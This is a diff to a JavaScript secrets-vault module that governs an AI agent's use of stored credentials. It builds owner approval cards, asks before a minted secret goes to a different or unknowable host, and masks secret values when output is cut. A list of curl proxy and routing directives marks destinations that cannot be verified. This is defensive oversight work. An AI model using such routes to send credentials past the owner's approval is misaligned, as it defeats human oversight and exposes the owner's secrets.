+    // no URL, `psql` over a service, `rclone remote:`) is not a local command — no host read is not «no host»; a target the
+    // shape cannot list (`unread`) and a destination its config keeps (`confDest`: git's url.<base>.insteadOf in the
+    // project's own .git/config, an rclone remote) are blind too
+    blind: kind !== 'tool' || !known || !hosts.size || unread || keyed.length > 0 || configFile || !!(row && (row.runsProject || row.confDest)) || !!run.programWritable,
   };
 }
 /** THE KEY a remembered «always» is stored under — everything decision ④ says, nothing positional. */
 const shapeKeyOf = (s) => `${SHAPE_V}:${JSON.stringify([s.tool, s.sub, s.flags, s.args, s.hosts, s.entries, s.injection, s.env, s.templates, s.on, s.script, s.keyed])}`;
+
+// ── THE CARD'S FACTS (lane vault-agent-own r20; the owner 2026-10-27 «这个卡片的可读性很差») ──
+// The run card was an English prose wall on a Chinese UI. `cardFactsOf` writes ONE STRUCTURED field the client (wake-approve-card
+// r7) renders in the viewer's language — CODES from closed tables, never sentences (a value is never prose; test-architecture's
+// i18n road is red for a code with no en/zh/ja key on the client). `detail` (today's prose) stays on the record for older clients
+// and is never shown beside `facts`. PURE: every door-resolved display string (the conversation's name, the home dir to make
+// paths relative, the already-redacted command, each entry's Vault-window name) is handed in as `names` — this module reads no
+// store. The CLOSED tables below are the whole vocabulary of each `why`; the fixture scripts/fixtures/vault-run-card-facts.json
+// (3 variants) is written FROM cardFactsOf and shared byte-for-byte with lane wake-approve-card (int-C diff-checks it).
+const ALWAYS_WHY = Object.freeze(['destination-unknown', 'program-writable', 'config-reads', 'card-too-long', 'redirect', 'brace-var', 'opaque-route', 'agent-template']);
+const HOSTS_WHY = Object.freeze(['tool-names-none', 'opaque', 'config-driven']);
+const MASKING = Object.freeze(['common-encodings']);
+const CARD_SHAPES = Object.freeze(['tool', 'line']);
+const WHY_AGAIN = Object.freeze(['folder', 'env', 'secret-set', 'arg-order', 'arg-space', 'args']);   // round 25 (minor 6b): why a near-identical rerun asks AGAIN — the ONE dimension that differs from the last late-allowed command; a CODE the client renders (env also carries the changed var name)
+const CARD_FACTS_CODES = Object.freeze({ always: ALWAYS_WHY, hosts: HOSTS_WHY, masking: MASKING, shape: CARD_SHAPES, whyAgain: WHY_AGAIN });   // one export lane wake-approve-card's test pins its code words against
+
+// round 23 (MAJOR, bounds): the client card store (lane wake-approve-card) walks `facts` and REFUSES any string over this many
+// UTF-16 units (and the whole ≤ 24 KB, depth ≤ 4). Every facts string is clipped to this, surrogate-safe, with a `*Cut` marker;
+// the WHOLE value rides a chunked fold (`cmdFull` / `textFull`, each chunk ≤ this) the client reassembles — so a 2 485-char
+// command (ask_unfiled on 4ff55fb4, where facts.cmd was head.cmd up to 4096) files, and «always» never rests on a template the
+// owner cannot read. The bound + the fold are written in /var/tmp/vibespace-lanes/vault-card-contract.md and told to wake's lane.
+const CARD_STRING_MAX = 2000;
+/** Clip to ≤ max UTF-16 units, never splitting a surrogate pair → { text, cut }. */
+function clipStr(sx, max = CARD_STRING_MAX) {
+  const str = String(sx == null ? '' : sx);
+  if (str.length <= max) return { text: str, cut: false };
+  let end = max; const c = str.charCodeAt(end - 1); if (c >= 0xd800 && c <= 0xdbff) end -= 1;
+  return { text: str.slice(0, end), cut: true };
+}
+/** The whole value in ≤ max-unit chunks (the fold the client reassembles), surrogate-safe. */
+function chunkStr(sx, max = CARD_STRING_MAX) {
+  const str = String(sx == null ? '' : sx); const out = [];
+  for (let i = 0; i < str.length;) { let end = Math.min(i + max, str.length); const c = str.charCodeAt(end - 1); if (end < str.length && c >= 0xd800 && c <= 0xdbff) end -= 1; out.push(str.slice(i, end)); i = end; }
+  return out.length ? out : [''];
+}
+/** round 25 (minor 6a): a facts string field + its cut marker + its chunked fold, as an object to spread — { <key>: text } or
+ *  { <key>: text, <key>Cut: true, <key>Full: [chunks] }. Every clipped facts string carries its marker AND its fold (the client
+ *  reassembles it), so the wake-approve-card store never sees a silently truncated 2000-char value and names nothing. */
+function clipFold(key, raw) {
+  const r = clipStr(raw);
+  return r.cut ? { [key]: r.text, [key + 'Cut']: true, [key + 'Full']: chunkStr(raw) } : { [key]: r.text };
+}
+/** A ref the door could NOT name ⇒ a short, non-telling id «<field>:<6 hex>» (never the URI — the row name may itself be
+ *  telling). PURE (no crypto import keeps this module PURE → PURE): a 32-bit FNV-1a over the ref id. */
+function shortRefId(ref) {
+  let h = 0x811c9dc5; const s = String((ref && ref.id) || '');
+  for (let i = 0; i < s.length; i++) { h = Math.imul(h ^ s.charCodeAt(i), 0x01000193); }
+  return `${(ref && ref.field) || 'ref'}:${(h >>> 0).toString(16).padStart(8, '0').slice(0, 6)}`;
+}
+const homeRel = (p, home) => { const x = String(p == null ? '' : p), h = String(home || ''); return h && (x === h || x.startsWith(h + '/')) ? '~' + x.slice(h.length) : x; };
+const baseName = (p) => String(p == null ? '' : p).replace(/\/+$/, '').split('/').pop() || String(p == null ? '' : p);
+
+/** How ONE ref reaches the child, as { kind: 'env'|'file'|'stdin'|'arg', name }: env:<NAME> · file:<placeholder NAME, or null
+ *  for an inline $VAULT_FILE> · stdin · arg (bare on the command line) · a template file that EMBEDS it ($VAULT{…}) ⇒ file with
+ *  the template's NAME. The same categories run.injection carries, read back PER reference. */
+function injectionOfRef(spec, ref) {
+  const e = (spec.env || []).find((x) => x.ref === ref.ref); if (e) return { kind: 'env', name: e.name };
+  const f = (spec.files || []).find((x) => x.ref === ref.ref); if (f) return { kind: 'file', name: f.name || null };
+  if (spec.stdin === ref.ref) return { kind: 'stdin', name: null };
+  const tf = (spec.files || []).find((x) => x.template != null && typeof x.text === 'string' && scanRefs(x.text).refs.some((z) => z.id === ref.id));
+  if (tf) return { kind: 'file', name: tf.name || null };
+  return { kind: 'arg', name: null };
+}
+
+/** Why «always» is withheld, as a CODE in ALWAYS_WHY. A shown config template that nests a directive names WHY by the directive
+ *  kind (a redirect, a {{var}}, an opaque route, else a plain nested read); otherwise the shape's `noAlways` maps in. */
+function alwaysWhyOf(shape) {
+  if (shape.always) return null;
+  const cr = shape.configReads ? String(shape.configReads) : '';
+  if (cr) {
+    const key = cr.split(/\s+/)[0];
+    if (['location', 'location-trusted', 'proto-redir'].includes(key)) return 'redirect';
+    if (/\{\{/.test(cr)) return 'brace-var';
+    if (['url', 'connect-to', 'resolve', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'doh-url', 'ipfs-gateway'].includes(key)) return 'opaque-route';
+    return 'config-reads';
+  }
+  switch (shape.noAlways) {
+    case 'unknown-destination': return 'destination-unknown';
+    case 'program-writable': return 'program-writable';
+    case 'runs-project-code': return 'program-writable';   // the code that runs is not fixed either — the same promise «always» cannot make
+    case 'config-file': return 'config-reads';
+    case 'opaque-route': return 'opaque-route';   // int361 (the vault pair): vault-use-grants' opaque route (routeOpaque) names its own why
+    default: return 'destination-unknown';                  // a non-'tool' kind (a shell / an interpreter): where it sends cannot be told
+  }
+}
+
+/** Why the destination is unknown, as a CODE in HOSTS_WHY — read only when routeHosts is empty. */
+function hostsWhyOf(shape) {
+  if (shape.configReads || shape.noAlways === 'config-file') return 'config-driven';   // a config file names the host we cannot read
+  if (shape.noAlways === 'runs-project-code') return 'opaque';                          // its own code / its project config routes (git insteadOf, an rclone remote)
+  return 'tool-names-none';                                                             // nothing in the command named a routing host
+}
+
+/**
+ * PURE. The owner's run card as STRUCTURED FACTS (codes, never prose) — the record's `facts` field (v2), rendered by the client
+ * in the viewer's language. `spec` = planOf, `shape` = shapeOf(spec), `cwd` = the run folder (absolute). `names` = the door's
+ * resolved display strings and reasons { who, home, cmd, entries, refsInfo, away, notOwn }: `who` the conversation's name;
+ * `home` the home dir (paths show relative as `~`); `cmd` the command that RUNS (round 23 MAJOR: the RAW argv — a $VAULT ref is a
+ * placeholder, nothing to mask; NOT head.cmd, whose name-belt hid the agent's own `-d password=…` the child receives); `entries`
+ * a { <ref.id>: <Vault-window name> } map (a ref the door could not name falls to shortRefId); `refsInfo` the per-ref facts
+ * [{ id, own, prov, forHost, open }]; `away` the verdict's [{ id, ref, forHost, host, unknown, keep }] (a minted value minted for
+ * X, this run sends it to Y); `notOwn` another conversation stored it. The facts carry EVERYTHING the approval rests on — each
+ * shown template's TEXT, the plain env the child gets, the reasons as CODES — so a facts client (which never shows `detail`) shows
+ * the same card. Every string is bounded to CARD_STRING_MAX, a longer one cut (marker) with the whole value in a chunked fold.
+ * → EXACTLY the contract object (the fixture).
+ */
+function cardFactsOf(spec, shape, cwd, names = {}) {
+  const home = names.home || '', ent = names.entries || {}, info = {};
+  for (const e of names.refsInfo || []) info[e.id] = e;
+  const away = names.away || [], awayOfId = (id) => away.find((a) => a.id === id) || null;
+  const secrets = (spec.refs || []).map((r) => {
+    const i = info[r.id] || {}, aw = awayOfId(r.id);
+    return {
+      ...clipFold('name', ent[r.id] || shortRefId(r)), ...clipFold('entry', String(r.entry)), ...clipFold('ref', r.ref), as: injectionOfRef(spec, r),
+      own: !!i.own, provenance: i.own ? (i.prov === 'minted' ? 'minted' : 'stored') : (i.open ? 'granted' : null),   // whose entry it is, as a CODE
+      forHost: i.forHost || null,                                                                                     // the host a minted value was minted FOR
+      sendsTo: aw ? (aw.unknown ? null : aw.host || null) : null,                                                     // the host this run would SEND it to (null = unknown)
+    };
+  });
+  const cmdRaw = String(names.cmd == null ? '' : names.cmd), cmdC = clipStr(cmdRaw), whoC = clipStr(names.who);
+  const known = (shape.routeHosts || []).length > 0;
+  const templates = (spec.files || []).filter((f) => f.template != null && typeof f.text === 'string')
+    .map((f) => { const text = String(f.text), b = bytesOf(text), shown = b <= TEMPLATE_CARD_MAX, c = clipStr(text); return { label: f.name || null, bytes: b, shown, text: shown ? c.text : '', ...(shown && c.cut ? { textFull: chunkStr(text) } : {}) }; });   // a shown template's TEXT rides the card (chunked when long); an over-bound one (> TEMPLATE_CARD_MAX ⇒ card_too_long, never a card) carries no text, shown:false
+  const env = (spec.plainEnv || []).map((e) => ({ ...clipFold('name', e.name), ...clipFold('value', e.value) }));   // the plain (non-secret) env the child gets; round 25 (minor 6a): a clipped name / value carries its *Cut marker + its *Full fold (the store no longer sees a bare 2000-char string and names nothing)
+  return {
+    v: 2,
+    who: whoC.text, ...(whoC.cut ? { whoCut: true } : {}),
+    tool: { name: baseName(spec.tool), path: clipStr(homeRel(spec.tool, home)).text, writable: !!spec.programWritable },
+    cmd: cmdC.text, ...(cmdC.cut ? { cmdCut: true, cmdFull: chunkStr(cmdRaw) } : {}),
+    folder: clipStr(homeRel(cwd, home)).text,
+    secrets,
+    env,
+    hosts: known ? { known: true, list: [...shape.routeHosts] } : { known: false, list: [], why: hostsWhyOf(shape) },
+    shape: shape.kind === 'tool' ? 'tool' : 'line',
+    always: { offered: !!shape.always, why: shape.always ? null : alwaysWhyOf(shape), ...(shape.configReads ? clipFold('directive', String(shape.configReads)) : { directive: null }) },
+    reason: (away.length || names.notOwn) ? { notOwn: !!names.notOwn, away: away.map((a) => ({ ref: clipStr(a.ref || '').text, forHost: a.forHost || null, host: a.unknown ? null : a.host || null, unknown: !!a.unknown, keep: !!a.keep })) } : null,
+    templates,
+    masking: 'common-encodings',
+  };
+}
 
 // ── WHICH ENTRIES A RUN MAY NEVER REFERENCE (each has its own door; the owner opens the rest one by one) ──
 const OWN_DOORS = Object.freeze([
@@ -685,8 +1182,31 @@ function ownDoorOf(ref) {
  * `seen` = the owner allowed this (conversation, shape) once already, this unlock (the door's memory — lane vault-run-door);
  * `instance` 'cluster' | 'local'; `policy` 'ask' | 'allow' | null (null = the instance's: a cluster asks EVERY time, a local one
  * asks the first time and allows a SEEN shape — decision ②: «a new shape asks; a local instance allows after one 允许»).
+ * lane vault-agent-own: an entry's facts may say `own` (an agent entry the caller made — open by construction), `prov`
+ * ('stored' | 'minted') and `forHost` (a mint's `--for`); `passes` = [{ id, host }] the owner already allowed a minted value to
+ * go to. Every entry its own and no minted value bound for another host ⇒ { ok: true, by: 'own' } — no card; an ask says
+ * `why` (['not-own'] — an entry the caller did not make · ['another-host'] — a minted value to a host it was not made for)
+ * and `away` (the hosts to allow — ONCE each).
  */
-function runVerdict({ state, plan, shape = null, entries = [], granted = false, remembered = null, seen = false, instance = 'local', policy = null, now = Date.now() } = {}) {
+/** Where a run sends what it reads CANNOT be told from its shape (lane vault-agent-own, the review): a shell or an interpreter
+ *  (its own code decides), a tool outside the table, a routing flag (ssh -o / curl --connect-to / -x …), a config file the card
+ *  cannot show, the project's own code (npm / pip / docker), a program an agent could have written — and (round 2) a known
+ *  tool whose host the table did not read: every row of the table reaches the network. A known tool naming hosts sends there.
+ *  `shapePasses` = a 允许 for such a shape is remembered (`keep`) — a LOCAL instance's rule; a CLUSTER asks every run of it
+ *  (round 2: never looser than the owner's own entries there — only a live «always», behind the second password, passes it). */
+const destUnknown = (sh) => !sh || sh.blind !== false;   // shapeOf's `blind` (a shape that does not say is blind)
+function awayOf(refs, facts, shape, passes = [], { shapePasses = true } = {}) {
+  const out = [], hosts = shape && Array.isArray(shape.routeHosts) ? shape.routeHosts : [], ps = Array.isArray(passes) ? passes : [];   // round 15 (MAJOR): the ONE host set — a minted value needs a card ONLY for a ROUTING host (-R/--hostname/GH_HOST/a repo spec/gh api <url>), never a URL named in a body / title / template (that is a `mentions` line on the card, never a target, never a pass)
+  const unknown = destUnknown(shape), shapePass = unknown ? `?${shapeKeyOf(shape)}` : null;   // an unknown destination is passed per SHAPE, never per host
+  for (const r of refs || []) {
+    const e = facts.get(r.id);
+    if (!e || e.own !== true || e.prov !== 'minted') continue;   // a value the agent PUT (it saw it) asks nothing, ever
+    if (unknown) { if (!(shapePasses && ps.some((p) => p && p.id === r.id && p.host === shapePass))) out.push({ ref: r.ref, id: r.id, forHost: forHostOf(e.forHost), host: null, pass: shapePass, unknown: true, keep: !!shapePasses }); continue; }
+    for (const h of hosts) if (!sameHost(h, e.forHost) && !ps.some((p) => p && p.id === r.id && p.host === h)) out.push({ ref: r.ref, id: r.id, forHost: forHostOf(e.forHost), host: h, pass: h, keep: true });
+  }
+  return out;
+}
+function runVerdict({ state, plan, shape = null, entries = [], granted = false, remembered = null, seen = false, instance = 'local', policy = null, passes = [], now = Date.now() } = {}) {
   if (state === 'not_set_up') return refuse('vault_not_set_up');
   if (state !== 'unlocked') return refuse('vault_locked');
   if (!plan || !plan.ok) return plan && plan.code ? plan : refuse('bad_flag');
@@ -697,14 +1217,22 @@ function runVerdict({ state, plan, shape = null, entries = [], granted = false, 
     if (door) return refuse('entry_has_its_own_door', { ref: r.ref, door, words: `${WORDS.entry_has_its_own_door}: ${door}` });
     const e = facts.get(r.id);
     if (!e || !e.exists) return refuse('entry_unknown', { ref: r.ref });
-    if (e.open !== true) return refuse('entry_not_runnable', { ref: r.ref });
+    if (e.open !== true && e.own !== true) return refuse('entry_not_runnable', { ref: r.ref });   // lane vault-agent-own: its own entry is open to its conversation by construction
     if (!(Number(e.bytes) >= MIN_MASK_BYTES)) return refuse('entry_too_short_to_mask', { ref: r.ref });
   }
   if (granted !== true) return refuse('use_not_granted');
-  if (sh.always && remembered && (remembered.until == null || Number(remembered.until) > now)) return { ok: true, by: 'always' };
   const mode = policy === 'ask' || policy === 'allow' ? policy : instance === 'cluster' ? 'ask' : 'allow';
-  if (mode === 'allow' && seen === true) return { ok: true, by: 'seen' };   // a NEW shape always draws the card (lane vault-run-door's mutant)
-  return { ok: false, ask: true, code: 'ask', offers: sh.always ? ['once', 'always', 'deny'] : ['once', 'deny'], alwaysTtls: sh.always ? Object.keys(ALWAYS_TTLS) : [], alwaysDefault: sh.always ? ALWAYS_DEFAULT : null, reauth: sh.always, ttlMs: ASK_TTL_MS, noAlways: sh.noAlways, argvExposed: sh.argvExposed };
+  const live = !!(sh.always && remembered && (remembered.until == null || Number(remembered.until) > now));   // a remembered «always» (the second password gave it)
+  // THE OWN ROAD (lane vault-agent-own): what the caller made itself asks nothing — but a minted value bound for another host,
+  // or (round 2) through a shape whose destination cannot be told: once per shape on a local instance, EVERY run on a cluster
+  // unless a live «always» covers the shape (never a host: a host is passed once, by its own card)
+  const away0 = awayOf(plan.refs, facts, sh, passes, { shapePasses: mode === 'allow' }), away = away0.filter((x) => !(x.unknown && live));
+  const why = [...(plan.refs.some((r) => (facts.get(r.id) || {}).own !== true) ? ['not-own'] : []), ...(away.length ? ['another-host'] : [])];
+  if (!why.length) return { ok: true, by: away0.length ? 'always' : 'own' };
+  if (!why.includes('not-own') && !away.some((x) => x.unknown)) return { ok: false, ask: true, code: 'ask', why, away, offers: ['once', 'deny'], alwaysTtls: [], alwaysDefault: null, reauth: false, ttlMs: ASK_TTL_MS, noAlways: 'another-host', argvExposed: sh.argvExposed };   // ONCE per host: the answer is the host's pass, never a shape's «always»
+  if (!away.length && live) return { ok: true, by: 'always' };
+  if (!away.length && mode === 'allow' && seen === true) return { ok: true, by: 'seen' };   // a NEW shape always draws the card (lane vault-run-door's mutant)
+  return { ok: false, ask: true, code: 'ask', why, away, offers: sh.always ? ['once', 'always', 'deny'] : ['once', 'deny'], alwaysTtls: sh.always ? Object.keys(ALWAYS_TTLS) : [], alwaysDefault: sh.always ? ALWAYS_DEFAULT : null, reauth: sh.always, ttlMs: ASK_TTL_MS, noAlways: sh.noAlways, argvExposed: sh.argvExposed };
 }
 
 // ── THE SCRUBBER ──
@@ -1013,6 +1541,38 @@ function createRunMasker(secrets, streams = ['out', 'err']) {
     held = next;
     return out;
   }
+  // round 21/23 (fb-93219e801a, «never drop a byte»): on a CUT (the 2 MiB bound / a timeout / a lock / the caller gone) the held tail
+  // was DROPPED for good — a value begun near the end might be only half there, and flushed raw its half would leak. Now the CERTAIN
+  // prefix is flushed with step(true) (every COMPLETE value masked), and ONLY the trailing run that could be a HALF value is replaced
+  // with ONE placeholder: cutTailStart finds the earliest offset a value could be beginning and running off the end — a raw form half
+  // present (base64/hex/percent/json/utf16/the raw value itself), a VIEW-decoded value half present (a complete-token decode whose tail
+  // is a value prefix), or a trailing INCOMPLETE view token (a `&`/`\`/`=`/ESC run that may not have closed). A tail that is none of
+  // these is flushed CLEAN and counts NO hit (round 23: the old code replaced the WHOLE held window — up to W, unbounded over blank
+  // lines / colour codes — and counted a scrubbed hit where no value was). A normal end has no partial, so `cut` leaves it alone.
+  const CUT_PH = placeholderOf({ label: '\u2026' });   // the cut tail's placeholder «[vault:\u2026]» — the uncertain trailing window, not any one value
+  function cutTailStart(buf) {
+    const L = buf.length;
+    if (!L) return L;
+    const isPrefix = (sfx) => { if (!sfx) return false; for (const t of texts) if (t.length > sfx.length && t.startsWith(sfx)) return true; return false; };   // a NON-EMPTY proper prefix of some spelled form
+    const prefixStart = (str) => { const n = str.length; for (let q = Math.max(0, n - W); q < n; q++) if (isPrefix(str.slice(q))) return q; return n; };   // earliest offset whose suffix-to-the-end is a value prefix (W bounds the search)
+    let start = prefixStart(buf);                                  // a raw / encoded form half present at the tail
+    for (const vw of VIEWS) {
+      for (let q = Math.max(0, L - vw.max + 1); q < L; q++) if (vw.triggers.includes(buf[q])) { if (q < start) start = q; break; }   // a trailing INCOMPLETE view token (its first trigger within the last vw.max-1 chars) — its decode is unknown ⇒ uncertain from there
+      const r = readView(vw, buf, L, false);
+      if (r) { const ps = prefixStart(r.sk); if (ps < r.sk.length) { const raw = r.at[ps]; if (raw != null && raw < start) start = raw; } }   // a complete-token VIEW decode whose tail is a value prefix — mapped back to a raw offset
+    }
+    return start;
+  }
+  function endStep(cut) {
+    if (!cut || !re) return step(true);   // a COMPLETE stream (or no secrets): flush all, every complete match masked — no partial to fear
+    const own = new Map(); for (const [k, x] of held) own.set(k, (own.get(k) || '') + x);
+    const keepFrom = new Map(); for (const [k, x] of own) keepFrom.set(k, cutTailStart(x));
+    held = [];
+    for (const [k, x] of own) { const sIdx = keepFrom.get(k); if (sIdx > 0) held.push([k, x.slice(0, sIdx)]); }   // the CERTAIN prefix (no trailing partial) — step(true) masks its complete values and flushes the rest clean
+    const out = step(true);
+    for (const [k, x] of own) { const sIdx = keepFrom.get(k); if (sIdx < x.length) { out[k] = (out[k] || '') + CUT_PH; st.hits++; st.bytes += bytesOf(x.slice(sIdx)); } }   // ONLY the uncertain trailing window becomes a placeholder (and counts one hit); a clean tail adds nothing
+    return out;
+  }
   return {
     push(stream, chunk) {
       if (!names.includes(stream)) throw new TypeError(`no such stream: ${stream}`);
@@ -1020,24 +1580,24 @@ function createRunMasker(secrets, streams = ['out', 'err']) {
       if (t) { const last = held[held.length - 1]; if (last && last[0] === stream) last[1] += t; else held.push([stream, t]); }
       return step(false);
     },
-    end: () => step(true),
+    end: (cut = false) => endStep(cut),
     get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W, streams: names,
   };
 }
 /** ONE stream's scrubber (a whole text, the belt's): the run masker with one stream. → { push(chunk) → text, end() → text, hits, bytes, byForm, window }. */
 function createMasker(secrets) {
   const m = createRunMasker(secrets, ['out']);
-  return { push: (chunk) => m.push('out', chunk).out, end: () => m.end().out, get hits() { return m.hits; }, get bytes() { return m.bytes; }, get byForm() { return m.byForm; }, window: m.window };
+  return { push: (chunk) => m.push('out', chunk).out, end: (cut) => m.end(cut).out, get hits() { return m.hits; }, get bytes() { return m.bytes; }, get byForm() { return m.byForm; }, window: m.window };
 }
 /** One whole text scrubbed (a card's command, a short output, the output belt's sink text). */
 function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }
 
 module.exports = {
-  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
-  parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, isFreeEntry, refFor: refOf,
+  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TEMPLATE_CARD_MAX, urlHostsBad, parseCfgLine, cfgRouteHosts, repoHostOf, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
+  parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, ownsAgentEntry, forHostOf, sameHost, ghCredEnvFor, isFreeEntry, refFor: refOf,
   INJECTIONS, injectionOf, ENV_HIJACK, ENV_CONFIG, envRefusedOf,
-  TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf,
+  TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf, targetOf, conninfoHosts, urlHosts, urlParse, configNestedFile,
   RUN_FLAGS, parseRunArgs, timeoutOf, planOf, materialize,
-  shapeOf, shapeKeyOf, destinationsOf, routeTargetsOf, sshTargetHost, targetOf, urlParse, splitAuthority, normHost, SSH_OPT_TABLE, SSH_LOCAL_O, SSH_HOST_OPTS, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, runVerdict,
+  shapeOf, shapeKeyOf, destinationsOf, routeTargetsOf, sshTargetHost, targetOf, urlParse, splitAuthority, normHost, SSH_OPT_TABLE, SSH_LOCAL_O, SSH_HOST_OPTS, cardFactsOf, CARD_STRING_MAX, ALWAYS_WHY, HOSTS_WHY, MASKING, CARD_SHAPES, WHY_AGAIN, CARD_FACTS_CODES, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, awayOf, runVerdict,
   FORMS, FORM_ROWS, VIEWS, formsOf, createMasker, createRunMasker, maskText,
 };
